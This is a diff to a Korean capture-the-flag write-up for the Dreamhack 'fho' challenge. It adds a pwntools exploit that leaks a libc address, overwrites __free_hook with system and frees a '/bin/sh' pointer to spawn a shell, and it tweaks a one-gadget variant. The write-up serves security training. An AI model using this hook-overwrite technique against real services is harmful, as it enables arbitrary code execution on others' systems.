@@ -119,6 +119,35 @@ free(addr);
 
 buf에 0x48의 dummy 값을 넣어 출력되는 값은 `__libc_start_main_ret`가 되므로 해당 값을 통해 `libc_base`를 구한다. 이후 `__free_hook`을 이용하기 위해 해당 Symbol를 구하고, One-gadget을 통해 Exploit하면 된다.
 
+### Exploit
+```python
+from pwn import *
+
+p = process('./fho', env = {'LD_PRELOAD' : './libc-2.27.so'})
+# p = remote('host3.dreamhack.games', 10103)
+e = ELF('./fho')
+libc = ELF('./libc-2.27.so')
+
+buf = b'A'*0x48
+p.sendafter('Buf: ', buf)
+p.recvuntil(buf)
+
+libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)
+libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
+binsh_offset = list(libc.search(b'/bin/sh\x00'))[0]
+
+free_hook = libc_base + libc.symbols['__free_hook']
+system = libc_base + libc.symbols["system"]
+binsh = libc_base + binsh_offset
+
+p.sendlineafter("To write: ", str(free_hook))
+p.sendlineafter("With: ", str(system))
+p.sendlineafter("To free: ", str(binsh))
+
+p.interactive()
+```
+
+### One-Gadget Exploit
 ```python
 from pwn import *
 
@@ -136,7 +165,7 @@ one_gadget = libc_base + 0x4f432 # one gadget values
 
 p.sendlineafter("write: ", str(free_hook))
 p.sendlineafter("With: ", str(one_gadget))
-p.sendlineafter("free: ", "0")
+p.sendlineafter("free: ", "0") # any values
 
 p.interactive()
 ```
